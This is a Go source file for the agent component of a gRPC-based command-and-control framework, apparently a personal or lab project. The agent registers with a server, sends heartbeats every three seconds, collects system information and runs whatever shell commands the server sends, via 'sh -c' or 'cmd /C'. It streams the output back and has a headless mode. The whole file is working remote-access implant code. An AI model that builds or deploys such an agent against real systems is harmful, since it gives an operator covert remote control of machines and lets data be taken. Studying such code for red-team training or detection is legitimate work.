package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"syscall"
	"time"

	pb "github.com/ardhptr21/c2-grpc/pb"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

var (
	agentID      string
	outputClient pb.OutputServiceClient
	startTime    = time.Now()
	headlessMode bool
)

func main() {
	serverAddr := flag.String("server", "localhost:50051", "gRPC server address")
	logFile := flag.String("log-file", "", "optional log file path")
	flag.BoolVar(&headlessMode, "headless", false, "run without interactive stdout output")
	flag.Parse()

	configureLogging(*logFile)

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	conn, err := grpc.Dial(*serverAddr, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		log.Fatalf("dial error: %v", err)
	}
	defer conn.Close()

	agentClient := pb.NewAgentServiceClient(conn)
	heartbeatClient := pb.NewHeartbeatServiceClient(conn)
	taskClient := pb.NewTaskServiceClient(conn)
	outputClient = pb.NewOutputServiceClient(conn)

	hostname, err := os.Hostname()
	if err != nil {
		log.Fatalf("hostname error: %v", err)
	}
	hostname = fmt.Sprintf("%s-%d", hostname, os.Getpid())

	reg, err := agentClient.Register(ctx, &pb.RegisterRequest{
		Hostname: hostname,
		Os:       runtime.GOOS,
		Ip:       "127.0.0.1",
	})
	if err != nil {
		log.Fatalf("register error: %v", err)
	}

	agentID = reg.GetAgentId()
	agentLog("[agent] %s", reg.GetMessage())

	go startHeartbeat(ctx, heartbeatClient, agentID)
	go startTaskListener(ctx, taskClient, agentID)

	<-ctx.Done()
	time.Sleep(200 * time.Millisecond)
}

func startHeartbeat(ctx context.Context, client pb.HeartbeatServiceClient, agentID string) {
	stream, err := client.SendHeartbeat(context.Background())
	if err != nil {
		log.Printf("[agent] heartbeat stream error: %v", err)
		return
	}

	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			summary, err := stream.CloseAndRecv()
			if err != nil {
				log.Printf("[agent] heartbeat close error: %v", err)
				return
			}
			agentLog("[agent] Heartbeat summary: received=%d last_status=%s", summary.GetTotalReceived(), summary.GetLastStatus())
			return
		case <-ticker.C:
			if err := stream.Send(&pb.HeartbeatRequest{
				AgentId:   agentID,
				Status:    "alive",
				Timestamp: time.Now().UnixMilli(),
			}); err != nil {
				log.Printf("[agent] heartbeat send error: %v", err)
				return
			}
		}
	}
}

func startTaskListener(ctx context.Context, client pb.TaskServiceClient, agentID string) {
	stream, err := client.ReceiveTasks(ctx, &pb.TaskRequest{AgentId: agentID})
	if err != nil {
		log.Printf("[agent] task stream error: %v", err)
		return
	}

	for {
		task, err := stream.Recv()
		if err == io.EOF || ctx.Err() != nil {
			return
		}
		if err != nil {
			log.Printf("[agent] task receive error: %v", err)
			return
		}

		agentLog("[agent] Task received: [%s] %s %s", task.GetTaskId(), task.GetCommand(), task.GetArgs())
		go executeTask(task)
	}
}

func executeTask(task *pb.Task) {
	command := task.GetCommand()
	args := task.GetArgs()

	stream, err := outputClient.SendOutput(context.Background())
	if err != nil {
		log.Printf("[agent] output stream error: %v", err)
		return
	}

	// Helper to send output chunks
	sendLine := func(line string) {
		if err := stream.Send(&pb.OutputChunk{
			TaskId:  task.GetTaskId(),
			AgentId: agentID,
			Line:    line,
		}); err != nil {
			log.Printf("[agent] output send error: %v", err)
		}
	}

	// Check built-ins
	switch command {
	case "sysinfo":
		var mem runtime.MemStats
		runtime.ReadMemStats(&mem)
		info := []string{
			fmt.Sprintf("Hostname: %s", hostnameOrUnknown()),
			fmt.Sprintf("Platform: %s", runtime.GOOS),
			fmt.Sprintf("Arch: %s", runtime.GOARCH),
			fmt.Sprintf("CPUs: %d", runtime.NumCPU()),
			fmt.Sprintf("RAM total: %d MB", bToMB(mem.Sys)),
			fmt.Sprintf("RAM free: %d MB", bToMB(mem.Frees)),
			fmt.Sprintf("Uptime: %s", time.Since(startTime).Truncate(time.Second)),
		}
		for _, line := range info {
			sendLine(line)
		}
	case "kill":
		sendLine("Shutting down agent. Goodbye.")
		if _, err := stream.CloseAndRecv(); err != nil {
			log.Printf("[agent] output close error: %v", err)
		}
		os.Exit(0)
	default:
		// Execute real command
		fullCommand := command
		if args != "" {
			fullCommand += " " + args
		}

		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/C", fullCommand)
		} else {
			cmd = exec.Command("sh", "-c", fullCommand)
		}

		stdout, err := cmd.StdoutPipe()
		if err != nil {
			sendLine(fmt.Sprintf("Error creating stdout pipe: %v", err))
		} else {
			cmd.Stderr = cmd.Stdout // Merge stderr
			if err := cmd.Start(); err != nil {
				sendLine(fmt.Sprintf("Error starting command: %v", err))
			} else {
				scanner := bufio.NewScanner(stdout)
				for scanner.Scan() {
					sendLine(scanner.Text())
				}
				if err := cmd.Wait(); err != nil {
					sendLine(fmt.Sprintf("Command exited with error: %v", err))
				}
			}
		}
	}

	if _, err := stream.CloseAndRecv(); err != nil {
		log.Printf("[agent] output close error: %v", err)
	}
}

func hostnameOrUnknown() string {
	hostname, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return hostname
}

func bToMB(v uint64) uint64 {
	return v / 1024 / 1024
}

func configureLogging(logFile string) {
	if logFile == "" {
		return
	}

	f, err := os.OpenFile(logFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o644)
	if err != nil {
		log.Fatalf("open log file: %v", err)
	}
	log.SetOutput(f)
}

func agentLog(format string, args ...any) {
	if headlessMode {
		log.Printf(format, args...)
		return
	}
	fmt.Printf(format+"\n", args...)
}
